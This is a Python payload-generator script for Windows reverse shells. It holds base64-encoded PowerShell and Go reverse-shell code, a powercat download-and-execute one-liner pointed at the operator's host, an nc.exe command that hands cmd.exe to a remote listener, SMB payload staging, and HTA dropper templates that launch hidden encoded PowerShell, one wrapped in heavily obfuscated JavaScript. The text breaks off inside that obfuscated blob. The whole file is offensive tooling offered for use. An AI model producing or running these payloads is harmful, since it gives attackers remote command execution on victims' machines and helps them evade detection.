#!/usr/bin/env python3

#Author: felamos 

import base64
import argparse
import os
import requests
import sys

def Main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", "--ip", help="IP address", type=str)
    parser.add_argument("-p", "--port", help="PORT", type=str)
    parser.add_argument("-go", "--golang", help="Go reverse shell (currently making it)", action="store_true")
    parser.add_argument("-s","--smb", help="execute nc.exe via smb", action="store_true")
    parser.add_argument("-n","--normal", help="normal powershell rev", action="store_true")
    parser.add_argument("-c", "--command", help="Run your custom command")
    parser.add_argument("-nc","--powercat", help="use powercat.ps1", action="store_true")
    parser.add_argument("-ob", "--obfuscator", help="Get obfuscated payload", action="store_true")
    args = parser.parse_args()

    def reverse_shell(ip, port):
        #https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
        rev_b64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
        rev_plain = base64.b64decode(rev_b64).decode()
        rev = rev_plain.replace("SUPERIPA" , ip).replace("PORT", port)
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload

    def nc_shell(ip, port):
        #https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
        if os.path.exists('powercat.ps1') != True:
            print("[*] Downloading powercat.ps1")
            r = requests.get("https://gist.githubusercontent.com/felamos/866ee131d73faed35816e478b4478665/raw/3ed29578281d4e55947ef3f272f9ad242a3c1246/powercat.ps1")
            with open("powercat.ps1", 'w', encoding = 'utf-8') as f:
                f.write(r.text)
                f.close()
        rev = f"""IEX(New-Object Net.WebClient).DownloadString('http://{ip}:8000/powercat.ps1');powercat -c {ip} -p {port} -e cmd"""
        print("[*] Please start your python http server on port 8000, i will fix this issue later")
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload
    
    def smb_shell(ip, share, fname):
        if os.path.exists('smbserver.py') != True:
            print("[*] Downloading smbserver.py")
            r = requests.get("https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py")
            with open("smbserver.py", 'w', encoding = 'utf-8') as f:
                f.write(r.text)
                f.close()

        #https://lolbas-project.github.io/lolbas/Binaries/Expand/
        rev = f"expand \\\\\\\\{ip}\\\\{share}\\\\{fname} c:\\\\users\\\\public\\\\{fname}"
        print(rev)
        return rev

    def smb_exec(ip, port):
        if os.path.exists('nc.exe') != True:
            print("[*] Please download/copy nc.exe here.")
        rev = f"c:\\\\users\\\\public\\\\nc.exe {ip} {port} -e cmd.exe"
        print(rev)
        return rev

    def go(ip, port):
        #https://gist.githubusercontent.com/yougg/b47f4910767a74fcfe1077d21568070e/raw/5a314b4faaa6e5428af1131bde35b6ed38e160c1/reversecmd.go
        compiler = "GOOS=windows GOARCH=386 go build /tmp/shell.go"
        rev_b64 = "cGFja2FnZSBtYWluCmltcG9ydCgiYnVmaW8iCiJuZXQiCiJvcy9leGVjIgoic3lzY2FsbCIKKQpmdW5jIG1haW4oKXtyZXZlcnNlKCJTVVBFUklQQTpQT1JUIil9CmZ1bmMgcmV2ZXJzZShob3N0IHN0cmluZyl7YywgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLGhvc3QpCmlmIG5pbCAhPSBlcnIge2lmIG5pbCAhPSBjIHtjLkNsb3NlKCl9fQpyIDo9IGJ1ZmlvLk5ld1JlYWRlcihjKQpmb3Ige29yZGVyLCBlcnIgOj0gci5SZWFkU3RyaW5nKCdcbicpCmlmIG5pbCAhPSBlcnIge2MuQ2xvc2UoKQpyZXZlcnNlKGhvc3QpCnJldHVybn0KY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgb3JkZXIpCmNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Cm91dCwgXyA6PSBjbWQuQ29tYmluZWRPdXRwdXQoKQpjLldyaXRlKG91dCl9fQo="
        rev_plain = base64.b64decode(rev_b64).decode()
        rev = rev_plain.replace("SUPERIPA", ip).replace("PORT", port)
        with open("/tmp/shell.go", 'w', encoding = 'utf-8') as f:
            f.write(rev)
            f.close()
        try:
            print("[*] Compiling shell.go")
            os.system(compiler)
            print("[*] Compiled!")
            sys.stdout = None
        except:
            print("[*] Please install golang!")
    
    def custom_command(cmd):
        rev = cmd.replace("\\" , "\\\\")
        return rev
    
    def hta(payload):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtdyAxIC1lbmMgQkFTRTY0IiwgMCk7d2luZG93LmNsb3NlKCk7Cjwvc2NyaXB0Pgo8dGl0bGU+V2VpcmQgVGl0bGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+V0VJUkQgSFRBPC9oMT4KPGhyPgo8L2JvZHk+CjwvaHRtbD4KCg=="
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("BASE64" ,payload)
        with open("fela.hta",'w',encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print("[*] Written fela.hta")

    def hta_encrypt(payload):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CnZhciBfMHg1MGU1PVsnVjhLb3dwSENzOEtaJywnYjF3R0g4Syt3NTdDcXNLcXc0VVdQUT09JywndzUvQ2hTRER0QXM9Jywnd29mQ3Q4S09BUzhSY3NLV3c3TENyTU9EVkNrcU1Icz0nLCdMc0tNWU1PQ0lpMFpUVGpDdWNLSUFNS3l3Ni9DdHdIQ2dNS1J3NEF5dzU3Q2kwdkRseXJDa1VmRG5EekRweWZDdXliRGlWVk9NY0tOd29mQ21sZ2x3N00yRlF2RHQ4S0hMMW5DZzhPaXc2a0N3cDlPQ3hEQ3RzS1hmOE96JywnR0c1aGJnPT0nLCd3NWZEaHNPU2VBUT0nLCd3cm5Eb3NPQVdRPT0nLCd3NkFSTzhPUHdwYz0nLCdORE1YUXNLdXdwTjVFY0tUQnNPdFdrZz0nLCd3cWpEcVVnSUpGVT0nLCd3bzNDaWlIQ25zSzZRc0tad29MQ3BjT2VQdz09JywndzdacVZnRU8nLCd3NmJEcGpqRHU4T3l3NzB2JywndzZ0NFJnN0Noc0tlJywnWHlMRHRCUlRmSHc5VGNPc3dxMD0nLCdaY0tnd3AvQ3RnPT0nLCd3NDFRQ2hRPScsJ1NsOURmUT09JywnU0YxYmVCL0RtUT09Jywnd29iRGg4S0N3NDdDbG0vRG5NT093b01wQWc9PScsJ3c1RERpOE9SWkE9PScsJ3dvL0RwOEsyZHc9PSddOyhmdW5jdGlvbihfMHg0Nzk5YWQsXzB4NDEwN2UwKXt2YXIgXzB4NGMyOTM3PWZ1bmN0aW9uKF8weDU4YWUwZSl7d2hpbGUoLS1fMHg1OGFlMGUpe18weDQ3OTlhZFsncHVzaCddKF8weDQ3OTlhZFsnc2hpZnQnXSgpKTt9fTtfMHg0YzI5MzcoKytfMHg0MTA3ZTApO30oXzB4NTBlNSwweGU4KSk7dmFyIF8weDI1Yjc9ZnVuY3Rpb24oXzB4MWY4NDZiLF8weDhjNzcyYil7XzB4MWY4NDZiPV8weDFmODQ2Yi0weDA7dmFyIF8weDQ3ZmFlZD1fMHg1MGU1W18weDFmODQ2Yl07aWYoXzB4MjViN1snZWFGdW1uJ109PT11bmRlZmluZWQpeyhmdW5jdGlvbigpe3ZhciBfMHgyZjdiZDQ7dHJ5e3ZhciBfMHgyMWU1NmM9RnVuY3Rpb24oJ3JldHVyblx4MjAoZnVuY3Rpb24oKVx4MjAnKyd7fS5jb25zdHJ1Y3RvcihceDIycmV0dXJuXHgyMHRoaXNceDIyKShceDIwKScrJyk7Jyk7XzB4MmY3YmQ0PV8weDIxZTU2YygpO31jYXRjaChfMHgxZmE4ZDIpe18weDJmN2JkND13aW5kb3c7fXZhciBfMHhlNTk0MDA9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JztfMHgyZjdiZDRbJ2F0b2InXXx8KF8weDJmN2JkNFsnYXRvYiddPWZ1bmN0aW9uKF8weDU4NmEyMSl7dmFyIF8weDVhODlhYT1TdHJpbmcoXzB4NTg2YTIxKVsncmVwbGFjZSddKC89KyQvLCcnKTtmb3IodmFyIF8weDRlYjk4ZT0weDAsXzB4MTlmZWIzLF8weDM2ODNjYixfMHg0NTllNWI9MHgwLF8weDI4OWQwNz0nJztfMHgzNjgzY2I9XzB4NWE4OWFhWydjaGFyQXQnXShfMHg0NTllNWIrKyk7fl8weDM2ODNjYiYmKF8weDE5ZmViMz1fMHg0ZWI5OGUlMHg0P18weDE5ZmViMyoweDQwK18weDM2ODNjYjpfMHgzNjgzY2IsXzB4NGViOThlKyslMHg0KT9fMHgyODlkMDcrPVN0cmluZ1snZnJvbUNoYXJDb2RlJ10oMHhmZiZfMHgxOWZlYjM+PigtMHgyKl8weDRlYjk4ZSYweDYpKToweDApe18weDM2ODNjYj1fMHhlNTk0MDBbJ2luZGV4T2YnXShfMHgzNjgzY2IpO31yZXR1cm4gXzB4Mjg5ZDA3O30pO30oKSk7dmFyIF8weDE5ZjUwMz1mdW5jdGlvbihfMHgzZmEyMzMsXzB4OGM3NzJiKXt2YXIgXzB4M2IwNDA0PVtdLF8weDNlZGFjZD0weDAsXzB4NTM1ZmU2LF8weDRjOWM1Mz0nJyxfMHg1OTRjYjA9Jyc7XzB4M2ZhMjMzPWF0b2IoXzB4M2ZhMjMzKTtmb3IodmFyIF8weDJjNzNhYz0weDAsXzB4NWE0ZDM5PV8weDNmYTIzM1snbGVuZ3RoJ107XzB4MmM3M2FjPF8weDVhNGQzOTtfMHgyYzczYWMrKyl7XzB4NTk0Y2IwKz0nJScrKCcwMCcrXzB4M2ZhMjMzWydjaGFyQ29kZUF0J10oXzB4MmM3M2FjKVsndG9TdHJpbmcnXSgweDEwKSlbJ3NsaWNlJ10oLTB4Mik7fV8weDNmYTIzMz1kZWNvZGVVUklDb21wb25lbnQoXzB4NTk0Y2IwKTtmb3IodmFyIF8weDY0NTVhMj0weDA7XzB4NjQ1NWEyPDB4MTAwO18weDY0NTVhMisrKXtfMHgzYjA0MDRbXzB4NjQ1NWEyXT1fMHg2NDU1YTI7fWZvcihfMHg2NDU1YTI9MHgwO18weDY0NTVhMjwweDEwMDtfMHg2NDU1YTIrKyl7XzB4M2VkYWNkPShfMHgzZWRhY2QrXzB4M2IwNDA0W18weDY0NTVhMl0rXzB4OGM3NzJiWydjaGFyQ29kZUF0J10oXzB4NjQ1NWEyJV8weDhjNzcyYlsnbGVuZ3RoJ10pKSUweDEwMDtfMHg1MzVmZTY9XzB4M2IwNDA0W18weDY0NTVhMl07XzB4M2IwNDA0W18weDY0NTVhMl09XzB4M2IwNDA0W18weDNlZGFjZF07XzB4M2IwNDA0W18weDNlZGFjZF09XzB4NTM1ZmU2O31fMHg2NDU1YTI9MHgwO18weDNlZGFjZD0weDA7Zm9yKHZhciBfMHgzZGViOTk9MHgwO18weDNkZWI5OTxfMHgzZmEyMzNbJ2xlbmd0aCddO18weDNkZWI5OSsrKXtfMHg2NDU1YTI9KF8weDY0NTVhMisweDEpJTB4MTAwO18weDNlZGFjZD0oXzB4M2VkYWNkK18weDNiMDQwNFtfMHg2NDU1YTJdKSUweDEwMDtfMHg1MzVmZTY9XzB4M2IwNDA0W18weDY0NTVhMl07XzB4M2IwNDA0W18weDY0NTVhMl09XzB4M2IwNDA0W18weDNlZGFjZF07XzB4M2IwNDA0W18weDNlZGFjZF09XzB4NTM1ZmU2O18weDRjOWM1Mys9U3RyaW5nWydmcm9tQ2hhckNvZGUnXShfMHgzZmEyMzNbJ2NoYXJDb2RlQXQnXShfMHgzZGViOTkpXl8weDNiMDQwNFsoXzB4M2IwNDA0W18weDY0NTVhMl0rXzB4M2IwNDA0W18weDNlZGFjZF0pJTB4MTAwXSk7fXJldHVybiBfMHg0YzljNTM7fTtfMHgyNWI3WydoaXN5TVQnXT1fMHgxOWY1MDM7XzB4MjViN1snZHFqR0V1J109e307XzB4MjViN1snZWFGdW1uJ109ISFbXTt9dmFyIF8weDFkMDRkND1fMHgyNWI3WydkcWpHRXUnXVtfMHgxZjg0NmJdO2lmKF8weDFkMDRkND09PXVuZGVmaW5lZCl7aWYoXzB4MjViN1snRG5LVldSJ109PT11bmRlZmluZWQpe18weDI1YjdbJ0RuS1ZXUiddPSEhW107fV8weDQ3ZmFlZD1fMHgyNWI3WydoaXN5TVQnXShfMHg0N2ZhZWQsXzB4OGM3NzJiKTtfMHgyNWI3WydkcWpHRXUnXVtfMHgxZjg0NmJdPV8weDQ3ZmFlZDt9ZWxzZXtfMHg0N2ZhZWQ9XzB4MWQwNGQ0O31yZXR1cm4gXzB4NDdmYWVkO307dmFyIF8weDU1MmNjZT1mdW5jdGlvbigpe3ZhciBfMHgzODZmNDk9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4YmMzOThjLF8weDNjNTljZSl7dmFyIF8weDI2MTdjYT1fMHgzODZmNDk/ZnVuY3Rpb24oKXtpZihfMHgzYzU5Y2Upe3ZhciBfMHg1Y2NlMjQ9XzB4M2M1OWNlW18weDI1YjcoJzB4MCcsJyhbWHInKV0oXzB4YmMzOThjLGFyZ3VtZW50cyk7XzB4M2M1OWNlPW51bGw7cmV0dXJuIF8weDVjY2UyNDt9fTpmdW5jdGlvbigpe307XzB4Mzg2ZjQ5PSFbXTtyZXR1cm4gXzB4MjYxN2NhO307fSgpOyhmdW5jdGlvbigpe18weDU1MmNjZSh0aGlzLGZ1bmN0aW9uKCl7dmFyIF8weDM4YmZiMT1uZXcgUmVnRXhwKF8weDI1YjcoJzB4MScsJ1JvVXYnKSk7dmFyIF8weDRkMDRjYz1uZXcgUmVnRXhwKF8weDI1YjcoJzB4MicsJ1ZuSiknKSwnaScpO3ZhciBfMHg1MjhlZjc9XzB4MmM0NjI4KCdpbml0Jyk7aWYoIV8weDM4YmZiMVtfMHgyNWI3KCcweDMnLCdUQEFzJyldKF8weDUyOGVmNytfMHgyNWI3KCcweDQnLCdDMUAhJykpfHwhXzB4NGQwNGNjW18weDI1YjcoJzB4NScsJ2VEYUYnKV0oXzB4NTI4ZWY3K18weDI1YjcoJzB4NicsJzZEMHonKSkpe18weDUyOGVmNygnMCcpO31lbHNle18weDJjNDYyOCgpO319KSgpO30oKSk7YT1uZXcgQWN0aXZlWE9iamVjdChfMHgyNWI3KCcweDcnLCdpZkNWJykpO2Z1bmN0aW9uIF8weDJjNDYyOChfMHgzZjdlMmIpe2Z1bmN0aW9uIF8weDNjYTA5OShfMHgyMzZiMDcpe2lmKHR5cGVvZiBfMHgyMzZiMDc9PT1fMHgyNWI3KCcweDgnLCdkbVZuJykpe3JldHVybiBmdW5jdGlvbihfMHg0Njg4ZDgpe31bXzB4MjViNygnMHg5JywncVpFcycpXSgnd2hpbGVceDIwKHRydWUpXHgyMHt9JylbXzB4MjViNygnMHhhJywnbFFKJicpXShfMHgyNWI3KCcweGInLCdyTXlHJykpO31lbHNle2lmKCgnJytfMHgyMzZiMDcvXzB4MjM2YjA3KVtfMHgyNWI3KCcweGMnLCdqWXlWJyldIT09MHgxfHxfMHgyMzZiMDclMHgxND09PTB4MCl7KGZ1bmN0aW9uKCl7cmV0dXJuISFbXTt9W18weDI1YjcoJzB4ZCcsJ0NHKFQnKV0oXzB4MjViNygnMHhlJywnWnR0MScpK18weDI1YjcoJzB4ZicsJ0w5R1EnKSlbXzB4MjViNygnMHgxMCcsJ2VPenUnKV0oXzB4MjViNygnMHgxMScsJ2VPenUnKSkpO31lbHNleyhmdW5jdGlvbigpe3JldHVybiFbXTt9W18weDI1YjcoJzB4MTInLCdBQCg0JyldKF8weDI1YjcoJzB4MTMnLCdDMUAhJykrXzB4MjViNygnMHgxNCcsJ2FZaHknKSlbXzB4MjViNygnMHgxNScsJ2xLSGQnKV0oXzB4MjViNygnMHgxNicsJ3BOdjMnKSkpO319XzB4M2NhMDk5KCsrXzB4MjM2YjA3KTt9dHJ5e2lmKF8weDNmN2UyYil7cmV0dXJuIF8weDNjYTA5OTt9ZWxzZXtfMHgzY2EwOTkoMHgwKTt9fWNhdGNoKF8weDQ1NzQ2NSl7fX0KdmFyIF8weDFmOTM9WydKaFhDaU1LYicsJ00xbkNrc0tYUnc9PScsJ2FoakRpc0tWJywnZHhQRGljS1VYdz09Jywnd29iRGc4S2knLCd3cVhEcXNLandvekRyZz09JywndzYvRGhjS0t3cGQzdzdZPScsJ2FzT0Z3NXRNd3JqQ3B6ZGtLc09tQkE9PScsJ3dySWxPWFBDbjhPNFpzS0p3cVhDc1NVQnc2Y3l3NnM9JywnRWNLVGRjS2N3Nlp1ZHc9PScsJ1BEZkR1Y09LRmNLYicsJ0pNTzJORnM9JywndzZuRGl4RERvdz09JywndzdQQ2dtZFInLCd3NkRDczhLaEpRPT0nLCdLRDlZUHd3PScsJ1R5RENxY0tuUHc9PScsJ3c1UERyOE9BRHNLWFJ5VlR3cFkrd3BZZXdwUTZOOEtjJywndzREQ21zS2t3NVU1d3JzSFN6SkpCUjVITGNLR0NWaGhSRVhDcHhIQ3N5RERqVlVkRzhPTHdxTTZ3cVlwdzZNRHdxOG53cVF5d3BYQ3Q4S05Oc0tPdzVyQ2hzT09BY09lUzNKZmJzT1lYY09QSlJrc09YakRsZz09J107KGZ1bmN0aW9uKF8weDJiMjNiZCxfMHg0YmRkMzUpe3ZhciBfMHgxZTVlY2E9ZnVuY3Rpb24oXzB4MmUyNmNkKXt3aGlsZSgtLV8weDJlMjZjZCl7XzB4MmIyM2JkWydwdXNoJ10oXzB4MmIyM2JkWydzaGlmdCddKCkpO319O18weDFlNWVjYSgrK18weDRiZGQzNSk7fShfMHgxZjkzLDB4MTlmKSk7dmFyIF8weDQ4Njc9ZnVuY3Rpb24oXzB4NGJkODIyLF8weDJiZDZmNyl7XzB4NGJkODIyPV8weDRiZDgyMi0weDA7dmFyIF8weGI0YmRiMz1fMHgxZjkzW18weDRiZDgyMl07aWYoXzB4NDg2N1snTENPV1RKJ109PT11bmRlZmluZWQpeyhmdW5jdGlvbigpe3ZhciBfMHgyNTM2NjE7dHJ5e3ZhciBfMHgzNzNlYTY9RnVuY3Rpb24oJ3JldHVyblx4MjAoZnVuY3Rpb24oKVx4MjAnKyd7fS5jb25zdHJ1Y3RvcihceDIycmV0dXJuXHgyMHRoaXNceDIyKShceDIwKScrJyk7Jyk7XzB4MjUzNjYxPV8weDM3M2VhNigpO31jYXRjaChfMHgxMjcyMzApe18weDI1MzY2MT13aW5kb3c7fXZhciBfMHgzOTVlNDk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JztfMHgyNTM2NjFbJ2F0b2InXXx8KF8weDI1MzY2MVsnYXRvYiddPWZ1bmN0aW9uKF8weDRhNTFjZSl7dmFyIF8weDI5ZWM1Nj1TdHJpbmcoXzB4NGE1MWNlKVsncmVwbGFjZSddKC89KyQvLCcnKTtmb3IodmFyIF8weDVkOTNkZj0weDAsXzB4MWYyNDNiLF8weDQ1ZjRiMCxfMHgzZGE0M2M9MHgwLF8weDM5ZDNhNz0nJztfMHg0NWY0YjA9XzB4MjllYzU2WydjaGFyQXQnXShfMHgzZGE0M2MrKyk7fl8weDQ1ZjRiMCYmKF8weDFmMjQzYj1fMHg1ZDkzZGYlMHg0P18weDFmMjQzYioweDQwK18weDQ1ZjRiMDpfMHg0NWY0YjAsXzB4NWQ5M2RmKyslMHg0KT9fMHgzOWQzYTcrPVN0cmluZ1snZnJvbUNoYXJDb2RlJ10oMHhmZiZfMHgxZjI0M2I+PigtMHgyKl8weDVkOTNkZiYweDYpKToweDApe18weDQ1ZjRiMD1fMHgzOTVlNDlbJ2luZGV4T2YnXShfMHg0NWY0YjApO31yZXR1cm4gXzB4MzlkM2E3O30pO30oKSk7dmFyIF8weDM0YjRkNT1mdW5jdGlvbihfMHg0MzRmMzAsXzB4MmJkNmY3KXt2YXIgXzB4ZmJiNjRiPVtdLF8weDQ3NzcyNT0weDAsXzB4NGE5OGFmLF8weDM4YzIxYT0nJyxfMHgzZTFlOT0nJztfMHg0MzRmMzA9YXRvYihfMHg0MzRmMzApO2Zvcih2YXIgXzB4MjU4ODY2PTB4MCxfMHg0MjM3YmM9XzB4NDM0ZjMwWydsZW5ndGgnXTtfMHgyNTg4NjY8XzB4NDIzN2JjO18weDI1ODg2NisrKXtfMHgzZTFlOSs9JyUnKygnMDAnK18weDQzNGYzMFsnY2hhckNvZGVBdCddKF8weDI1ODg2NilbJ3RvU3RyaW5nJ10oMHgxMCkpWydzbGljZSddKC0weDIpO31fMHg0MzRmMzA9ZGVjb2RlVVJJQ29tcG9uZW50KF8weDNlMWU5KTtmb3IodmFyIF8weDQ0OTMxYz0weDA7XzB4NDQ5MzFjPDB4MTAwO18weDQ0OTMxYysrKXtfMHhmYmI2NGJbXzB4NDQ5MzFjXT1fMHg0NDkzMWM7fWZvcihfMHg0NDkzMWM9MHgwO18weDQ0OTMxYzwweDEwMDtfMHg0NDkzMWMrKyl7XzB4NDc3NzI1PShfMHg0Nzc3MjUrXzB4ZmJiNjRiW18weDQ0OTMxY10rXzB4MmJkNmY3WydjaGFyQ29kZUF0J10oXzB4NDQ5MzFjJV8weDJiZDZmN1snbGVuZ3RoJ10pKSUweDEwMDtfMHg0YTk4YWY9XzB4ZmJiNjRiW18weDQ0OTMxY107XzB4ZmJiNjRiW18weDQ0OTMxY109XzB4ZmJiNjRiW18weDQ3NzcyNV07XzB4ZmJiNjRiW18weDQ3NzcyNV09XzB4NGE5OGFmO31fMHg0NDkzMWM9MHgwO18weDQ3NzcyNT0weDA7Zm9yKHZhciBfMHgzMjJhNzA9MHgwO18weDMyMmE3MDxfMHg0MzRmMzBbJ2xlbmd0aCddO18weDMyMmE3MCsrKXtfMHg0NDkzMWM9KF8weDQ0OTMxYysweDEpJTB4MTAwO18weDQ3NzcyNT0oXzB4NDc3NzI1K18weGZiYjY0YltfMHg0NDkzMWNdKSUweDEwMDtfMHg0YTk4YWY9XzB4ZmJiNjRiW18weDQ0OTMxY107XzB4ZmJiNjRiW18weDQ0OTMxY109XzB4ZmJiNjRiW18weDQ3NzcyNV07XzB4ZmJiNjRiW18weDQ3NzcyNV09XzB4NGE5OGFmO18weDM4YzIxYSs9U3RyaW5nWydmcm9tQ2hhckNvZGUnXShfMHg0MzRmMzBbJ2NoYXJDb2RlQXQnXShfMHgzMjJhNzApXl8weGZiYjY0YlsoXzB4ZmJiNjRiW18weDQ0OTMxY10rXzB4ZmJiNjRiW18weDQ3NzcyNV0pJTB4MTAwXSk7fXJldHVybiBfMHgzOGMyMWE7fTtfMHg0ODY3WydjWWJ4dUgnXT1fMHgzNGI0ZDU7XzB4NDg2N1snWWppb1FHJ109e307XzB4NDg2N1snTENPV1RKJ109ISFbXTt9dmFyIF8weDUzZTUwNz1fMHg0ODY3WydZamlvUUcnXVtfMHg0YmQ4MjJdO2lmKF8weDUzZTUwNz09PXVuZGVmaW5lZCl7aWYoXzB4NDg2N1snUW9lRHFvJ109PT11bmRlZmluZWQpe18weDQ4NjdbJ1FvZURxbyddPSEhW107fV8weGI0YmRiMz1fMHg0ODY3WydjWWJ4dUgnXShfMHhiNGJkYjMsXzB4MmJkNmY3KTtfMHg0ODY3WydZamlvUUcnXVtfMHg0YmQ4MjJdPV8weGI0YmRiMzt9ZWxzZXtfMHhiNGJkYjM9XzB4NTNlNTA3O31yZXR1cm4gXzB4YjRiZGIzO307dmFyIF8weDJiZjVjOD1mdW5jdGlvbigpe3ZhciBfMHgzZmE1ODU9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4MzYwZDY4LF8weGY2N2JmMSl7dmFyIF8weDFkZWIyND1fMHgzZmE1ODU/ZnVuY3Rpb24oKXtpZihfMHhmNjdiZjEpe3ZhciBfMHgyMTQ0ZTU9XzB4ZjY3YmYxW18weDQ4NjcoJzB4MCcsJ3dsak4nKV0oXzB4MzYwZDY4LGFyZ3VtZW50cyk7XzB4ZjY3YmYxPW51bGw7cmV0dXJuIF8